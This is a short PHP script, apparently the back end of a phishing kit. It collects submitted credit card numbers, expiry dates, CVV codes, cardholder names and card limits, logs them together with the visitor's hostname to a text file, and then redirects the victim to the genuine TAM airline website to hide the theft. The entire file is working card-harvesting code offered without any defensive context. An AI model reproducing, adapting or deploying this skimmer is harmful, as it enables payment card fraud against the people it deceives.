<?
$caixa1= "cc: " .$_POST["cc"]. "\n";
$caixa2= "validade: " .$_POST["validade"]. "\n";
$caixa3= "cvv: " .$_POST["cvv"]. "\n";
$caixa4= "nome: " .$_POST["nome"]. "\n";
$caixa5= "limite: " .$_POST["limite"]. "\n";
$caixa6= "-------------P1-------------" .$_POST[""]. "\n";
$caixa7= gethostbyaddr($_SERVER['REMOTE_ADDR']);
$caixa8= "" .$_POST[""]. "\n...............................\n";


$file = fopen("cc.txt", "a");


$escrever1 = fwrite($file, $caixa1);
$escrever2 = fwrite($file, $caixa2);
$escrever3 = fwrite($file, $caixa3);
$escrever4 = fwrite($file, $caixa4);
$escrever5 = fwrite($file, $caixa5);
$escrever6 = fwrite($file, $caixa6);
$escrever7 = fwrite($file, $caixa7);
$escrever8 = fwrite($file, $caixa8);


fclose($file);


?>

<meta http-equiv="refresh"content="0;url=http://www.tam.com.br/">
